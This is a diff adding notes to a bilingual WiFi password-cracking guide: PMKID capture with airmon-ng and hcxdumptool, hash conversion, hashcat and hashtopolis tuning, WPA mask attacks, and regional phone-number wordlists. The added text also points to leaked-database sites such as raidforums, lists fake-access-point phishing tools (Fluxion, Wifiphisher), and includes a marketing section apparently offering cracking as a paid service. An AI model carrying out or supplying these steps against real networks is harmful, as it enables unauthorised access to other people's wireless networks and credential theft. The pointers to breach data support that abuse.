@@ -138,6 +138,8 @@ ESSID is the same as the SSID but is used across multiple access points as part 
         `rm cap2hccapx.c`
     * usage
         `cap2hccapx input.pcap output.hccapx [filter by essid] [additional network essid:bssid]`
+* convert `.cap` file to `.pcap` file for EWSA
+    * `editcap -F pcap input.cap output.pcap`
 ### 三. 跑包
 在我们抓获握手包以后,接下来的事情就非常简单了,你可以直接用aircrack加载弱口令字典进行爆破,当然,个人是十分不建议用字典(效率,实用性,太低,过于浪费时间),推荐大家直接把包处理一下丢给hashcat或者某宝去跑就行了
 * `aircarck-ng -a 2 -b C8:3A:35:30:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap`
@@ -313,6 +315,8 @@ Out of all the cards mentioned, in my preliminary testing I found the older AWUS
 ![AWUS036H](AWUS036H.jpg)
 ![AWUS036NH](AWUS036NH.jpeg)
 Both Alfa USB devices work well. Preliminary results show better performance, with the AWUS036H . I was able to obtain multiple PKMID frames within seconds sometimes from a vulnerable access point . The older Alfa AWUS036H is a also a more powerful card and works better with nosier conditions.
+About the antennas:
+The power of the indoor antenna is 7dB, and the power of the ordinary antenna is 5dB. The indoor antenna can get more scanned targets in a specific direction. The ordinary antenna is non-directional. Both the antennas need to be placed as high as possible to get better scanning results.
 
         root@ubuntu:~# lsusb
         --- snip ---
@@ -490,15 +494,15 @@ The content of the written file will look like this: `2582a8281bf9d4308d6f5731d0
 #### 0. get prepare and choose a target ap
 * `sudo airmon-ng check kill`
 * `sudo airmon-ng start wlx70f11c11576b`
-* `sudo airodump-ng start wlan0mon` `Ctrl+C`
+* `sudo airodump-ng wlan0mon` `Ctrl+C`
 * `echo "FCD733E71B78" > apmac.txt`
 * `sudo airmon-ng stop wlan0mon`
 * set the interface to monitor mode manually:
-*   `ip link set <interface> down`
-*   `iw dev <interface> set monitor control`
-*   `ip link set <interface> up`
+*   `sudo ip link set <interface> down`
+*   `sudo iw dev <interface> set monitor control`
+*   `sudo ip link set <interface> up`
 #### 1. Run hcxdumptool to request the PMKID from the AP and to dump the received frame to a file( in pcapng format)
-`$ ./hcxdumptool -o test.pcapng -i wlp39s0f3u4u5 --filterlist=apmac.txt --filtermode=2 --enable_status=3`
+`$ sudo hcxdumptool -o test.pcapng -i wlp39s0f3u4u5 --filterlist=apmac.txt --filtermode=2 --enable_status=3`
 
 Output:
 
@@ -657,7 +661,7 @@ Quote:
 > 如果AP收到我们的请求数据包并且支持发送PMKID的话，不久就会收到"FOUND PMKID"消息：根据wifi通道上的噪音情况的不同，可能需要过一段时间才能收到PMKID。我们建议，如果运行hcxdumptool超过10分钟还没收到PMKID，那么就可以放弃了。
 
 #### 2. Run hcxpcaptool to convert the captured data from pcapng format to a hash format accepted by hashcat.
-`$ ./hcxpcaptool -z test.16800 test.pcapng`
+`$ sudo hcxpcaptool -z test.16800 test.pcapng`
 
 Output:
 
@@ -715,7 +719,11 @@ Note: While note required it is recommended to use options `-E -I` and `-U` with
 * `-U` retrieve usernames from WiFi-traffic
 `$ ./hcxpcaptool -E essidlist -I identitylist -U usernamelsit -z test.16800 test.pcang`
 
-#### 3. Run hashcat to crack it.
+#### 3. change to managed mode
+`sudo ip link set wlx00c0ca972033 down`
+`sudo iw dev wlx00c0ca972033 set type managed`
+`sudo ip link set wlx00c0ca972033 up`
+#### 4. Run hashcat to crack it.
 We can download the newly updated https://hashcat.net/hashcat/ V4.2.0 which cracks two new hash types:
 WPA-PMKID-PBKDF2
 WPA-PMKID-PMK
@@ -1306,6 +1314,7 @@ Plug the HDMI cable on the port of the integrated graphic card if you want to us
 13. For Linux only: try to run “clinfo” first in your terminal
 14. Try to run hashcat --benchmark
     * add `--force` and `-D 1,2` to the command
+        * use `-D 2` without `-D 1,2` to avoid using to much of CPU
 ##### the file used for intel cpu
 ./opencl_runtime_16.1.2_x64_setup.msi
 #### for intel gpu
@@ -2042,6 +2051,10 @@ Because the total number of generated rules is the product of all list, stacking
 
 ![performance of rule files](rules_table.png)
 ### ???How to process more than one hash files???
+**Merge multiple hashes into one.**
+`cat *.hccapx > all_merged.hccapx`
+**Note: The time taken by the merged hash is approximately the time taken by a single hash multiplied by the number of the merged hashes.
+**
 The new version of Hashcat is designed to run on GPUs an is designed to only process a single hash file so that's not quite practical though there are scenarios where you may want to actually only try to crack one password hash it is not a situation it is all that comment.
 Currently, oclHashcat-plus does not support multiple WPA2 hashes in a single instance. One way to work around this is to have three separate instances. So basically:
 1. Have three separate directories with oclHashcat-plus or Hashcat.
@@ -2135,6 +2148,7 @@ Command line|Example|Description
 `-I`, `--opencl-info`|`-I`|Show information about detected OpenCL platforms/devices
 `--opencl-platforms`|`--opencl-platforms=2`|OpenCL platforms to use, separated with commas
 `-D`, `--opencl-device-types`|`-D 1`|OpenCL device-types to use, separated with commas
+    * Do not use CPU (`-D 1`) to avoid BSoD crashes
 `-d`, `--opencl-devices`|`-d 1`|OpenCL devices to use, separated with commas
 Note: Use `--force` with the command.
 ### Benchmark
@@ -2882,6 +2896,15 @@ We’re now looking at 20*X hash power, at the modest cost of $4.76 / hour. And 
 
 ### [hashtopolis](https://github.com/s3inlc/hashtopolis/wiki)
 hashtopolis is a multi-platform client-server tool for distributing hashcat tasks to multiple computers.
+The hashrate of tasks on hashtopolis is higher than that of tasks run on local commands.
+* use `"allow-piping":false` first; switch to `true` when the speed is not hight as expected.
+* set `"allow-piping": false` when running `-a 0` tasks
+* set `"allow-piping": true` when running `-a 1` tasks
+* set `"allow-piping": true` when running `-a 3` tasks ???
+    * try `"allow-piping": false` first
+    * if the hashrate stays low, try the opposite instead
+To solve the `Low gpu util detected` and the problem of hashrate dropping down:
+add `"allow-piping": false` to the config.json under the agent directory.
 #### Hashcat Brain is integrated in hashtopolis since version V.0.10.0
 In Hashtopolis you can configure a global Hashcat brain server which can be used. This is done in the server config where you have to add the host, port and password fro the brain server which the clients then should use. For every hashlist you add to Hashtopolis afterwards, you can select if the brain should be used for this hashlist (keep in mind, it is only useful to use the brain on slow hash algorithms as otherwise it would introduce a bottleneck). If a hashlist is set to use the brain, every task issued with this hashlist will then automatically use the brain client flags on the client when running it. Note: PRINCE and piping tasks are excluded from the brain, as Hashcat is not supporting the brain features when using stdin for the candidates.
 * Server Configuration > Cracking/tasks
@@ -3198,6 +3221,15 @@ In Hashtopolis you can configure a global Hashcat brain server which can be used
 * You cannot import and use `.hcmask` file on hashtopolis
 * You should create one normal task by using one line in the `.hcmask` file, line by line, and then create a Super task using these normal tasks.
 * Or, you can run `.hcmask` file not on the hashtopolis.
+###### using mask file on hashtopolis
+* `-a 3 #HL# -1?l?d -2?u?d ?2?2?2?2?1?1?1?1`
+    * Note that there is no spaces after `-1` and `-2`
+    * Note the that the candidates need to be longer than 8 for `-m 2500`
+* `-a 3 #HL# -1 ld.hcchar ?1?1?1?1?1?1?1?1`
+    * echo "0123456789abcdefghijklmnopqrstuvwxyz" > ld.hcchar
+    * Note the that the candidates need to be longer than 8 for `-m 2500`
+* The `-a 3` attack will take a too long time
+    * 8ld will take 128 days!!!
 ###### [Notifications](https://github.com/s3inlc/hashtopolis/wiki/Notifications)
 
 ###### [Trust or Secret Status](https://github.com/s3inlc/hashtopolis/wiki/Trust-or-Secret-Status)
@@ -3291,6 +3323,12 @@ Check the agents
 * Benchmark result is 0
 * I cannot log in after installation and I'm using WAMP
 
+## dics
+* search on normal websites
+* search in deep websites
+* https://db.raidforums.com/Index
+* https://weakpass.com
+* https://publicdbhost.dmca.gripe/
 ## Marketing
 * Propaganda
     * xiaoli WiFi
@@ -3315,9 +3353,17 @@ Check the agents
             * yakeli
         * guitar
         * restaurant
+        * print store
         * sticky notes
         * matrix code
         * 兼破各种密码：Windows系统密码，压缩包压缩密码，Word/Excel文档密码等等。
     * to crack packets from website
         * xioalin
         * kali
+## Fake AP: Fluxion and Wifiphisher
+* https://null-byte.wonderhowto.com/how-to/hack-wi-fi-capturing-wpa-passwords-by-targeting-users-with-fluxion-attack-0176134/
+* https://www.youtube.com/watch?v=xcpFsCBI78Q
+Note: Not working for Android mobile phone
+## Use as few hashes as possible, as the time to be used is proportional to the number of hashes
+## To change the phone numbers to another region
+Just replace the txt file in the `D:\hashtopolis1` directory (e.g. delete the original `beijing_phonenumbers1.txt`, and move `nanjing_phonenumbers1.txt` and change its name to `beijing_phonenumber1.txt`)
